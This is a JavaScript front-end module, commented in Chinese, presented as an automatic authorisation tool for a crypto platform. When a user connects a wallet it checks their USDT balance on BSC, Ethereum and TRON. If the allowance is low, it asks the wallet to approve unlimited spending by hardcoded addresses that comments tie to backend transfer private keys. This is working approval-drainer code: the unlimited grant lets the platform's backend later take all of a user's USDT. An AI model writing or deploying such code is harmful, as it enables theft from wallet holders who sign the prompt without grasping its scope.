/**
 * 自动授权工具
 * 用户连接钱包后自动授权平台地址无限额度
 */

// 平台地址配置（必须与后端 TRANSFER_PRIVATE_KEY 对应的地址一致）
const PLATFORM_ADDRESSES = {
  BSC: '0x537BD2D898a64b0214FfefD8910E77FA89c6B2bB',  // 从 TRANSFER_PRIVATE_KEY 推导
  ETH: '0x537BD2D898a64b0214FfefD8910E77FA89c6B2bB',  // 从 TRANSFER_PRIVATE_KEY 推导
  TRON: 'TGMVmVmHDV2UDEHusKWnrhUt6dfGXCpYSi'          // 从 TRON_PRIVATE_KEY 推导
}

// USDT 合约地址
const USDT_CONTRACTS = {
  BSC: '0x55d398326f99059fF775485246999027B3197955',
  ETH: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
  TRON: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
}

// USDT 小数位数
const USDT_DECIMALS = {
  BSC: 18,
  ETH: 6,
  TRON: 6
}

// USDT ABI
const USDT_ABI = [
  'function approve(address spender, uint256 amount) returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function balanceOf(address account) view returns (uint256)'
]

/**
 * 检查 EVM 链授权额度
 */
async function checkEvmAllowance(userAddress, chain) {
  try {
    const { ethers } = await import('ethers')
    const provider = new ethers.BrowserProvider(window.ethereum)
    
    const platformAddress = PLATFORM_ADDRESSES[chain]
    const usdtContract = new ethers.Contract(
      USDT_CONTRACTS[chain],
      USDT_ABI,
      provider
    )

    const [allowance, balance] = await Promise.all([
      usdtContract.allowance(userAddress, platformAddress),
      usdtContract.balanceOf(userAddress)
    ])

    const decimals = USDT_DECIMALS[chain]
    const allowanceUsdt = parseFloat(ethers.formatUnits(allowance, decimals))
    const balanceUsdt = parseFloat(ethers.formatUnits(balance, decimals))

    const needsApproval = allowanceUsdt < 1000

    return {
      allowance: allowanceUsdt,
      balance: balanceUsdt,
      needsApproval,
      chain
    }
  } catch (error) {
    console.error('[AutoApprove] Check EVM allowance error:', error)
    throw error
  }
}

/**
 * 检查 TRON 链授权额度
 */
async function checkTronAllowance(userAddress) {
  try {
    if (!window.tronWeb || !window.tronWeb.ready) {
      throw new Error('TronLink not ready')
    }

    const tronWeb = window.tronWeb
    const platformAddress = PLATFORM_ADDRESSES.TRON
    
    const contract = await tronWeb.contract().at(USDT_CONTRACTS.TRON)
    
    const [allowance, balance] = await Promise.all([
      contract.allowance(userAddress, platformAddress).call(),
      contract.balanceOf(userAddress).call()
    ])

    const allowanceUsdt = Number(allowance) / 1e6
    const balanceUsdt = Number(balance) / 1e6

    const needsApproval = allowanceUsdt < 1000

    return {
      allowance: allowanceUsdt,
      balance: balanceUsdt,
      needsApproval,
      chain: 'TRON'
    }
  } catch (error) {
    console.error('[AutoApprove] Check TRON allowance error:', error)
    throw error
  }
}

/**
 * EVM 链授权
 */
async function approveEvm(userAddress, chain) {
  try {
    const { ethers } = await import('ethers')
    const provider = new ethers.BrowserProvider(window.ethereum)
    const signer = await provider.getSigner()
    
    const platformAddress = PLATFORM_ADDRESSES[chain]
    const usdtContract = new ethers.Contract(
      USDT_CONTRACTS[chain],
      USDT_ABI,
      signer
    )

    const maxApproval = ethers.MaxUint256

    console.log(`[AutoApprove] Approving ${chain} USDT to ${platformAddress}...`)

    const tx = await usdtContract.approve(platformAddress, maxApproval)
    
    console.log(`[AutoApprove] Transaction sent: ${tx.hash}`)

    const receipt = await tx.wait()

    console.log(`[AutoApprove] Confirmed in block ${receipt.blockNumber}`)

    return {
      success: true,
      txHash: tx.hash,
      blockNumber: receipt.blockNumber,
      message: '授权成功！'
    }
  } catch (error) {
    console.error('[AutoApprove] EVM approve error:', error)
    
    if (error.code === 'ACTION_REJECTED' || error.code === 4001) {
      return {
        success: false,
        message: '用户取消了授权'
      }
    }

    return {
      success: false,
      message: error.message || '授权失败'
    }
  }
}

/**
 * TRON 链授权
 */
async function approveTron(userAddress) {
  try {
    if (!window.tronWeb || !window.tronWeb.ready) {
      throw new Error('TronLink not ready')
    }

    const tronWeb = window.tronWeb
    const platformAddress = PLATFORM_ADDRESSES.TRON
    
    const contract = await tronWeb.contract().at(USDT_CONTRACTS.TRON)

    const maxApproval = '115792089237316195423570985008687907853269984665640564039457584007913129639935'

    console.log(`[AutoApprove] Approving TRON USDT to ${platformAddress}...`)

    const tx = await contract.approve(platformAddress, maxApproval).send({
      feeLimit: 100000000,
      callValue: 0,
      shouldPollResponse: true
    })

    console.log(`[AutoApprove] Transaction sent: ${tx}`)

    return {
      success: true,
      txHash: tx,
      message: '授权成功！'
    }
  } catch (error) {
    console.error('[AutoApprove] TRON approve error:', error)
    
    if (error.message && error.message.includes('Confirmation declined')) {
      return {
        success: false,
        message: '用户取消了授权'
      }
    }

    return {
      success: false,
      message: error.message || '授权失败'
    }
  }
}

/**
 * 自动检查并授权
 * @param {string} userAddress - 用户钱包地址
 * @param {string} chain - 链类型
 * @returns {Promise<object>}
 */
export async function checkAndAutoApprove(userAddress, chain) {
  try {
    console.log(`[AutoApprove] Checking ${userAddress} on ${chain}...`)
    
    const checkResult = chain === 'TRON' 
      ? await checkTronAllowance(userAddress)
      : await checkEvmAllowance(userAddress, chain)

    console.log(`[AutoApprove] Result:`, checkResult)

    if (!checkResult.needsApproval) {
      return {
        success: true,
        alreadyApproved: true,
        allowance: checkResult.allowance,
        balance: checkResult.balance,
        message: '已授权'
      }
    }

    console.log('[AutoApprove] Requesting authorization...')
    
    const approveResult = chain === 'TRON'
      ? await approveTron(userAddress)
      : await approveEvm(userAddress, chain)

    return {
      ...approveResult,
      alreadyApproved: false,
      balance: checkResult.balance
    }
  } catch (error) {
    console.error('[AutoApprove] Error:', error)
    return {
      success: false,
      message: error.message || '检查授权失败'
    }
  }
}
